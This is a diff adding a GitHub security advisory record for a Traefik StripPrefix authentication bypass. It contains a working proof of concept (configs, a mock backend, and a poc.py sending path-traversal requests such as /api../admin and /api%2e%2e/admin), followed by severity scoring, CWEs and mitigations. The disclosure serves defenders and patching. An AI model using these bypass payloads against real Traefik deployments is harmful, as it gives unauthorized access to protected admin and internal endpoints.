@@ -1,0 +1,103 @@
+{
+  "id": "GHSA-xf64-8mw2-4gr2",
+  "modified": "2026-06-11T13:30:23.847672626Z",
+  "published": "2026-06-11T13:26:57Z",
+  "aliases": [
+    "CVE-2026-48020"
+  ],
+  "summary": "Traefik has a StripPrefix Route-Level Auth Bypass via Path Normalization",
+  "details": "## Summary\n\nThere is a high severity vulnerability in Traefik's `StripPrefix` middleware that allows an unauthenticated attacker to bypass route-level authentication and authorization. When a public router matches on a `PathPrefix` rule and applies the `StripPrefix` middleware, a request path containing `..` or its percent-encoded form `%2e%2e` can match the public route at routing time and then, after the prefix is stripped and the path is normalized, resolve to a path served by a separate, authenticated router. As a result, an attacker can reach protected backend paths — such as admin or internal configuration endpoints — without satisfying the authentication middleware attached to the protected router.\n\n## Patches\n\n- https://github.com/traefik/traefik/releases/tag/v2.11.48\n- https://github.com/traefik/traefik/releases/tag/v3.6.19\n- https://github.com/traefik/traefik/releases/tag/v3.7.3\n\n## For more information\n\nIf there are any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n\n\u003cdetails\u003e\n\u003csummary\u003eOriginal Description\u003c/summary\u003e\n\n# Traefik StripPrefix Route-Level Auth Bypass via Path Normalization (/api../)\n\n## Summary\n\nA route-level authentication/authorization bypas was found in Traefik when `PathPrefix`-based public routes are combined with `StripPrefix`.\n\nA request using `/api../` or `/api%2e%2e/` can avoid protected router rules at the routing stage, but after `StripPrefix`, the path is normalized and forwarded to the backend as a protected path such as `/admin` or `/internal/config`.\n\nThis is reproducible on patched/latest Traefik versions and appears related to, but distinct from, previously disclosed `StripPrefixRegex` / path-normalization issues.\n\nThis report specifically affects `StripPrefix`.\n\n## Affected Versions Tested\n\n| Image | Observed Version | Result |\n|---|---|---|\n| `traefik:v2.11` | `v2.11.46` | Affected |\n| `traefik:v3.6` | `v3.6.17` | Affected |\n| `traefik:latest` | `v3.7.1` | Affected |\n\n### Lab Contrast\n\n| Image | Result |\n|---|---|\n| `traefik:v2.10` | Not reproduced in lab |\n| `traefik:v3.5` | Not reproduced in lab |\n\n## Vulnerable Configuration Pattern\n\nThe issue appears when:\n\n- a broad public route strips a prefix\n- while a separate protected route is intended to guard internal/admin paths\n\n```yaml\nhttp:\n  routers:\n    public-api:\n      rule: 'PathPrefix(`/api`) \u0026\u0026 !PathPrefix(`/api/admin`) \u0026\u0026 !PathPrefix(`/api/internal`)'\n      entryPoints:\n        - web\n      middlewares:\n        - strip-api\n      service: backend\n\n    protected:\n      rule: 'PathPrefix(`/admin`) || PathPrefix(`/internal`)'\n      entryPoints:\n        - web\n      middlewares:\n        - auth\n      service: backend\n\n  middlewares:\n    strip-api:\n      stripPrefix:\n        prefixes:\n          - /api\n\n    auth:\n      basicAuth:\n        users:\n          - 'test:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/'\n\n  services:\n    backend:\n      loadBalancer:\n        servers:\n          - url: http://backend:9000\n```\n\n## Observed Behavior\n\n### Direct Protected Paths\n\nThese are correctly blocked.\n\n| Request | Expected | Observed |\n|---|---|---|\n| `GET /admin` | Blocked | `401` |\n| `GET /internal/config` | Blocked | `401` |\n\n### Expected Public Exclusions\n\nThese do not expose protected backend paths.\n\n| Request | Expected | Observed |\n|---|---|---|\n| `GET /api/admin` | Not routed to protected backend path | `404` |\n| `GET /api/internal/config` | Not routed to protected backend path | `404` |\n\n### Bypass Payloads\n\nThese reach protected backend paths.\n\n| Request | Observed Status | Backend Receives |\n|---|---|---|\n| `GET /api../admin` | `200` | `/admin` |\n| `GET /api%2e%2e/admin` | `200` | `/admin` |\n| `GET /api../internal/config` | `200` | `/internal/config` |\n| `GET /api%2e%2e/internal/config` | `200` | `/internal/config` |\n\n## Minimal PoC\n\n### docker-compose.yml\n\n```yaml\nservices:\n  traefik:\n    image: traefik:v3.7\n    command:\n      - --providers.file.filename=/etc/traefik/dynamic.yml\n      - --entrypoints.web.address=:8080\n      - --accesslog=true\n    ports:\n      - \"127.0.0.1:18080:8080\"\n    volumes:\n      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro\n    depends_on:\n      - backend\n\n  backend:\n    image: python:3.12-slim\n    working_dir: /app\n    command: python backend.py\n    volumes:\n      - ./backend.py:/app/backend.py:ro\n    expose:\n      - \"9000\"\n```\n\n### dynamic.yml\n\n```yaml\nhttp:\n  routers:\n    public-api:\n      rule: 'PathPrefix(`/api`) \u0026\u0026 !PathPrefix(`/api/admin`) \u0026\u0026 !PathPrefix(`/api/internal`)'\n      entryPoints:\n        - web\n      middlewares:\n        - strip-api\n      service: backend\n\n    protected:\n      rule: 'PathPrefix(`/admin`) || PathPrefix(`/internal`)'\n      entryPoints:\n        - web\n      middlewares:\n        - auth\n      service: backend\n\n  middlewares:\n    strip-api:\n      stripPrefix:\n        prefixes:\n          - /api\n\n    auth:\n      basicAuth:\n        users:\n          - 'test:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/'\n\n  services:\n    backend:\n      loadBalancer:\n        servers:\n          - url: http://backend:9000\n```\n\n### backend.py\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nimport json\n\nclass Handler(BaseHTTPRequestHandler):\n    def log_message(self, fmt, *args):\n        return\n\n    def _json(self, status, obj):\n        body = json.dumps(obj).encode()\n        self.send_response(status)\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.send_header(\"Content-Length\", str(len(body)))\n        self.end_headers()\n        self.wfile.write(body)\n\n    def do_GET(self):\n        if self.path == \"/admin\":\n            self._json(200, {\n                \"seen_path\": self.path,\n                \"secret\": \"ADMIN_SECRET_REACHED\"\n            })\n        elif self.path == \"/internal/config\":\n            self._json(200, {\n                \"seen_path\": self.path,\n                \"secret\": \"TRAEFIK_LAB_INTERNAL_CONFIG\"\n            })\n        elif self.path == \"/admin/exec\":\n            self._json(200, {\n                \"seen_path\": self.path,\n                \"rce_chain_marker\": True,\n                \"note\": \"protected execution endpoint reached\"\n            })\n        else:\n            self._json(404, {\n                \"seen_path\": self.path,\n                \"secret\": None\n            })\n\nHTTPServer((\"0.0.0.0\", 9000), Handler).serve_forever()\n```\n\n### poc.py\n\n```python\n#!/usr/bin/env python3\nfrom urllib.request import Request, urlopen\nfrom urllib.error import HTTPError\n\nBASE = \"http://127.0.0.1:18080\"\n\nPATHS = [\n    \"/admin\",\n    \"/internal/config\",\n    \"/api/admin\",\n    \"/api/internal/config\",\n    \"/api../admin\",\n    \"/api%2e%2e/admin\",\n    \"/api../internal/config\",\n    \"/api%2e%2e/internal/config\",\n    \"/admin/exec\",\n    \"/api/admin/exec\",\n    \"/api../admin/exec\",\n    \"/api%2e%2e/admin/exec\",\n]\n\nfor path in PATHS:\n    req = Request(BASE + path)\n    try:\n        with urlopen(req, timeout=5) as r:\n            status = r.status\n            body = r.read().decode(errors=\"replace\")\n    except HTTPError as e:\n        status = e.code\n        body = e.read().decode(errors=\"replace\")\n\n    print(f\"{path:28} {status} {body[:180]}\")\n```\n\n### Run\n\n```bash\ndocker compose up -d\npython3 poc.py\n```\n\n## Expected Vulnerable Output\n\n```text\n/admin                       401\n/internal/config             401\n/api/admin                   404\n/api/internal/config         404\n/api../admin                 200  backend seen_path=/admin\n/api%2e%2e/admin             200  backend seen_path=/admin\n/api../internal/config       200  backend seen_path=/internal/config\n/api%2e%2e/internal/config   200  backend seen_path=/internal/config\n/api../admin/exec            200  protected execution endpoint reached\n/api%2e%2e/admin/exec        200  protected execution endpoint reached\n```\n\n## Root Cause Hypothesis\n\nThe vulnerable behavior appears to be caused by path normalization after prefix stripping.\n\n```text\nIncoming path:              /api../admin\nAfter StripPrefix(\"/api\"):  /../admin\nAfter JoinPath():           /admin\n```\n\nThe request does not match the protected `/admin` router at the routing stage, but the backend receives `/admin` after normalization.\n\nThe relevant behavior appears related to `StripPrefix` calling `req.URL.JoinPath()` after removing the prefix in newer versions.\n\n## Security Impact\n\nAn unauthenticated network attacker can bypass intended Traefik route-level authentication/authorization boundaries and access backend paths that the operator intended to protect with a separate protected router.\n\nPotential impact includes:\n\n- Access to protected admin paths\n- Access to internal configuration endpoints\n- Exposure of secrets returned by internal backends\n- Access to protected backend management functionality\n- Conditional RCE if the protected backend exposes an execution primitive\n\nIn the local lab, a protected `/admin/exec` endpoint was reachable through `/api../admin/exec`, demonstrating a conditional RCE chain when the backend contains an execution primitive.\n\nThis is not a standalone Traefik RCE claim. It is an authentication/authorization boundary bypass that can expose protected backend functionality.\n\n## Suggested Severity\n\nSuggested CVSS is **10.0 Critical** with Scope Changed, because the bypass crosses the Traefik route-level authorization boundary and exposes protected backend functionality.\n\n```text\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N\n```\n\nScope Changed was selected because the request bypasses Traefik's route-level authorization boundary and reaches backend paths that are intended to be protected by a separate authenticated router.\n\nIf the vendor treats Traefik and the backend as the same security scope, the score may be interpreted as **9.1 Critical** with Scope Unchanged:\n\n```text\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\n```\n\nThe issue was submitted with the stronger Scope Changed interpretation, but the maintainers may adjust the final CVSS score during triage.\n\n## Weakness\n\nPrimary CWE:\n\n- `CWE-863: Incorrect Authorization`\n\nRelated weakness candidates:\n\n- `CWE-180: Incorrect Behavior Order: Validate Before Canonicalize`\n- `CWE-22: Improper Limitation of a Pathname to a Restricted Directory`\n\n## Mitigation Verified in Lab\n\nThe bypass was blocked when using a stricter prefix boundary:\n\n```text\nPathRegexp(`^/api(/|$)`)\n```\n\nor:\n\n```text\nPathPrefix(`/api/`) with StripPrefix(`/api/`)\n```\n\n## Relation to Existing Advisories\n\nThis appears related to the same vulnerability family as prior Traefik path normalization / `StripPrefixRegex` bypass advisories, but it affects `StripPrefix` and remains reproducible on patched/latest versions tested above.\n\nThis was reported as a possible incomplete fix or bypass variant rather than assuming it is a duplicate.\n\n## Reporter\n\nWonYun / kyun0\n\n\u003c/details\u003e",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v2",
+        "purl": "pkg:golang/github.com/traefik/traefik/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.11.48"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xf64-8mw2-4gr2/GHSA-xf64-8mw2-4gr2.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.6.19"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xf64-8mw2-4gr2/GHSA-xf64-8mw2-4gr2.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/traefik/traefik/v3",
+        "purl": "pkg:golang/github.com/traefik/traefik/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.7.0-ea.1"
+            },
+            {
+              "fixed": "3.7.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xf64-8mw2-4gr2/GHSA-xf64-8mw2-4gr2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/security/advisories/GHSA-xf64-8mw2-4gr2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/traefik/traefik"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v2.11.48"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.6.19"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/traefik/traefik/releases/tag/v3.7.3"
+    }
+  ]
+}
